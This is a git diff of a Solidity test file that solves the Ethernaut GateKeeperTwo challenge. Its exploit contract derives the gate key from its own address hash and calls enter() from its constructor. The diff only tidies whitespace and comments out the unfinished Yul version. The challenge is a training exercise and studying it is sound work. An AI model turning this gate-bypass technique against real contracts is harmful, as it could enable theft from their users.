@@ -8,16 +8,17 @@ import {BaseTest} from "./BaseTest.t.sol";
 contract GateKeeperTwoExploit {
     constructor(IGateKeeperTwo gateKeeperTwoInstance) {
         uint64 _a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
-        uint64 _gateKey = (_a ^ type(uint64).max);     
+        uint64 _gateKey = (_a ^ type(uint64).max);
         gateKeeperTwoInstance.enter(bytes8(_gateKey));
     }
 }
 
 contract GateKeeperTwoExploitYul {
     constructor(IGateKeeperTwo gateKeeperTwoInstance) {
-        uint64 _a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
-        uint64 _gateKey = (_a ^ type(uint64).max);     
-        gateKeeperTwoInstance.enter(bytes8(_gateKey));
+        // uint64 _a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
+        // uint64 _gateKey = (_a ^ type(uint64).max);
+        // gateKeeperTwoInstance.enter(bytes8(_gateKey));
+        // TODO: Assembly
     }
 }
 
@@ -31,7 +32,6 @@ contract GateKeeperTwoTest is BaseTest {
     function exploitSol() internal override {
         new GateKeeperTwoExploit(gateKeeperTwoInstance);
     }
-    
 
     function testExploitSol() public override {
         exploitSol();
@@ -40,19 +40,8 @@ contract GateKeeperTwoTest is BaseTest {
 
     function exploitYul() internal override {
         bytes memory initCode = type(GateKeeperTwoExploit).creationCode;
-        assembly {
-            // let size := mload(initCode)
-        //     mstore(initCode, add(size, 0x20))
-        //     mstore(add(initCode, add(0x20, size)), sload(instance.slot))
-        //     pop(create(0, add(initCode, 0x20), mload(initCode)))
-
-        //     mstore(0, "entrant()")
-        //     mstore(0, keccak256(0, 9))
-        //     pop(staticcall(gas(), sload(instance.slot), 0, 4, 0, 32))
-        //     if iszero(eq(mload(0), sload(player.slot))) {
-        //         revert(0, 0)
-        //     }
-        }
+        // TODO: Assembly
+        assembly {}
     }
 
     function testExploitYul() public override {
